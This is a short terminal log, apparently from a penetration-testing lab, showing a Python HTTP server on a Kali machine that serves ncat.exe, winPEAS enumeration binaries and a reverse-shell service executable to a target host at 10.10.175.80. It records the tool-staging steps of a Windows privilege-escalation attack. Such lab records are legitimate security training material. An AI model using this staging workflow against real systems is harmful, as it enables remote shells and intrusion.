
```sh
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.175.80 - - [23/Apr/2024 14:12:53] "GET /shells/ncat.exe HTTP/1.1" 200 -
10.10.175.80 - - [23/Apr/2024 14:12:53] "GET /shells/ncat.exe HTTP/1.1" 200 -
10.10.175.80 - - [23/Apr/2024 14:12:53] "GET /shells/ncat.exe HTTP/1.1" 200 -
10.10.175.80 - - [23/Apr/2024 14:12:53] "GET /shells/ncat.exe HTTP/1.1" 200 -
10.10.175.80 - - [23/Apr/2024 14:18:55] "GET /shells/ncat.exe HTTP/1.1" 304 -
10.10.175.80 - - [23/Apr/2024 14:18:55] "GET /shells/ncat.exe HTTP/1.1" 304 -
10.10.175.80 - - [23/Apr/2024 14:18:55] "GET /shells/ncat.exe HTTP/1.1" 304 -
10.10.175.80 - - [23/Apr/2024 14:18:55] "GET /shells/ncat.exe HTTP/1.1" 304 -
10.10.175.80 - - [23/Apr/2024 14:47:03] "GET /shells/ncat.exe HTTP/1.1" 304 -
10.10.175.80 - - [23/Apr/2024 14:47:03] "GET /shells/ncat.exe HTTP/1.1" 304 -
10.10.175.80 - - [23/Apr/2024 14:47:03] "GET /shells/ncat.exe HTTP/1.1" 304 -
10.10.175.80 - - [23/Apr/2024 14:47:03] "GET /shells/ncat.exe HTTP/1.1" 304 -
10.10.175.80 - - [23/Apr/2024 15:45:59] code 404, message File not found
10.10.175.80 - - [23/Apr/2024 15:45:59] "GET /enum/winPEASall.exe HTTP/1.1" 404 -
10.10.175.80 - - [23/Apr/2024 15:45:59] code 404, message File not found
10.10.175.80 - - [23/Apr/2024 15:45:59] "GET /enum/winPEASall.exe HTTP/1.1" 404 -
10.10.175.80 - - [23/Apr/2024 15:47:10] "GET /enum/winPEASany.exe HTTP/1.1" 200 -
10.10.175.80 - - [23/Apr/2024 15:47:11] "GET /enum/winPEASany.exe HTTP/1.1" 200 -
10.10.175.80 - - [23/Apr/2024 16:52:51] "GET /shells/revsh-win-x86-service.exe HTTP/1.1" 200 -
10.10.175.80 - - [23/Apr/2024 16:52:51] "GET /shells/revsh-win-x86-service.exe HTTP/1.1" 200 -
10.10.175.80 - - [23/Apr/2024 17:00:54] "GET /shells/revsh-win-x86-service.exe HTTP/1.1" 200 -
10.10.175.80 - - [23/Apr/2024 17:00:54] "GET /shells/revsh-win-x86-service.exe HTTP/1.1" 200 -
10.10.175.80 - - [23/Apr/2024 17:16:13] "GET /shells/revsh-win-x86-service.exe HTTP/1.1" 200 -
10.10.175.80 - - [23/Apr/2024 17:16:13] "GET /shells/revsh-win-x86-service.exe HTTP/1.1" 200 -

```